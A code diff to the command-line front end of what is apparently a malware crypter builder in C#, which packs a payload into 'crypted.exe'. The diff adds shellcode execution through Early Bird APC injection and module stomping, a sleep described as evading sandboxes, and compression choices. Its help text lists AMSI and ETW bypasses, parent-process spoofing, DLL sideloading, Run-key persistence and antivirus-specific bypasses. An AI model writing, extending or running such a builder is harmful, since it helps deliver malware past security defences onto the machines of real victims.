@@ -2,6 +2,7 @@ using System;
 using System.IO;
 using NRE.Builder.Configuration;
 using NRE.Builder.Commands;
+using NRE.Core.Common;
 using NRE.Core.Evasion;
 
 namespace NRE.Builder
@@ -14,6 +15,9 @@ namespace NRE.Builder
             string output = "crypted.exe";
             bool compress = false;
             bool outputBat = false;
+            int delaySeconds = 0;
+            string mutexName = "";
+            string compressFormat = "lznt1";
             // Default: AMSI + ETW only (reliable). Use --unhook / --wldp to add more.
             var evasion = EvasionOptions.PatchAMSI | EvasionOptions.PatchETW;
 
@@ -84,6 +88,22 @@ namespace NRE.Builder
                     case "--threadpool":
                         evasion |= EvasionOptions.ExecuteThreadPool;
                         break;
+                    case "--earlybird":
+                        evasion |= EvasionOptions.ExecuteEarlyBird;
+                        break;
+                    case "--module-stomping":
+                        evasion |= EvasionOptions.ExecuteModuleStomping;
+                        break;
+                    case "--delay":
+                        if (i + 1 < args.Length && int.TryParse(args[i + 1], out int d) && d >= 0 && d <= 3600)
+                        { delaySeconds = d; i++; }
+                        break;
+                    case "--mutex":
+                        if (i + 1 < args.Length) { mutexName = args[++i]; }
+                        break;
+                    case "--compress-format":
+                        if (i + 1 < args.Length) { compressFormat = args[++i].ToLowerInvariant(); }
+                        break;
                     case "--scriptblock-log":
                         evasion |= EvasionOptions.DisableScriptBlockLog;
                         break;
@@ -112,13 +132,21 @@ namespace NRE.Builder
             if (outputBat && !output.EndsWith(".bat", StringComparison.OrdinalIgnoreCase))
                 output = Path.ChangeExtension(output, ".bat");
 
+            var cfg = CompressionFormat.LZNT1;
+            if (compressFormat == "xpress" || compressFormat == "x") cfg = CompressionFormat.Xpress;
+            else if (compressFormat == "aplib" || compressFormat == "ap") cfg = CompressionFormat.Aplib;
+            else if (compressFormat == "none") cfg = CompressionFormat.None;
+
             var config = new BuildConfig
             {
                 InputPath = input,
                 OutputPath = output,
                 Compress = compress,
+                CompressionFormat = compress ? cfg : CompressionFormat.None,
                 Evasion = evasion,
                 OutputBat = outputBat,
+                DelaySeconds = delaySeconds,
+                MutexName = mutexName ?? "",
             };
 
             return BuildCommands.RunBuild(config) ? 0 : 1;
@@ -139,7 +167,8 @@ Output:
   -o, --output <path>    Output path (default: cryption.exe)
 
 Compression:
-  -c, --compress        Compress payload (LZNT1) before encryption
+  -c, --compress        Compress payload before encryption
+  --compress-format <f> lznt1|xpress|aplib|none (default: lznt1)
 
 Evasion (default: AMSI + ETW only; add others as needed):
   --no-amsi             Disable AMSI bypass
@@ -154,6 +183,10 @@ Evasion (default: AMSI + ETW only; add others as needed):
   --dll-sideload        Enable DLL sideloading
   --parent-spoof        Enable parent process spoofing
   --threadpool          Run shellcode via CLR thread pool (in-memory)
+  --earlybird           Run shellcode via Early Bird APC injection
+  --module-stomping     Run shellcode via module stomping (amsi.dll)
+  --delay <sec>         Sleep N seconds before execution (1-3600, evades sandbox)
+  --mutex <name>        Single-instance mutex (exit if already running)
   --scriptblock-log     Disable script block logging (ETW)
   --startup             Install to AppData and add Run key for startup persistence
   --specific            AV-specific bypasses: detect vendor and apply tailored bypass set
